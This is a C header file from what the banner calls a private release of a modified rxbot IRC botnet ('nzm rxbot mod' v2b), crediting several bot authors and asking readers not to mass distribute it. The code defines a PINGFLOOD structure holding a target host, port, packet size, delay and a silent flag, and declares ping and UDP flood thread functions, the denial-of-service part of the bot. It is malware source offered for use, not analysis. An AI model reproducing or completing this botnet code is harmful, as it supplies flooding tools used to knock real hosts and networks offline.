/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#if !defined NO_PING && !defined NO_UDP
 // ping/udp structure.
typedef struct PINGFLOOD
{
	SOCKET sock;
	char chan[128];
	char host[128];
	int num;
	int size;
	int delay;
	int port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PINGFLOOD;
#endif

#ifndef NO_PING
DWORD WINAPI ping(LPVOID param);
#endif

#ifndef NO_UDP
DWORD WINAPI udp(LPVOID param);
#endif

